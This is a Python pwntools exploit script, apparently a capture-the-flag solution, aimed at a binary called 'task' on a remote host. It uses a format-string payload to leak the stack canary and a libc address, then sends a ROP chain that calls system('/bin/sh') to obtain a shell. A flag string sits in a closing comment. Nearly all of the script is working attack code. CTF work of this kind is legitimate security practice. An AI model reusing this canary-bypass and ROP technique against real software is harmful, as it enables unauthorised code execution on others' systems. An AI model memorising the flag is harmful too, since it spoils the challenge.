#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./task")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

sshc = None
r = None
nc = "nc 44.201.242.37 1235"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def int16(x):
    return int(x, 16)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def main():
    global r
    r = conn()
    
    # Leak libc, stack canary using the format strings
    payload = "AAA.%25$p.%27$p"
    sendl(payload)
    
    r.recvuntil(b"AAA.")
    
    canary, libc_leak = map(int16, r.readline().strip().decode().split("."))
    libc_base   = libc_leak - libc.symbols.__libc_start_main - 243
    pop_rdi     = libc_base + 0x0000000000023b6a
    ret         = libc_base + 0x0000000000022679
    
    logh("Canary", canary)
    logh("libc leak", libc_leak)
    logh("libc base", libc_base)
    
    # Now ROP chain
    payload = b"a"*152
    payload += p64(canary)
    payload += p64(0)
    payload += p64(pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh")))
    payload += p64(ret) # stack alignment
    payload += p64(libc_base + libc.symbols.system)
    sendl(payload)

    r.interactive() # FLAG{fms_bUG5_ar3_mY_favorites_wh4t_ab0ut_y0u?}


if __name__ == "__main__":
    main()

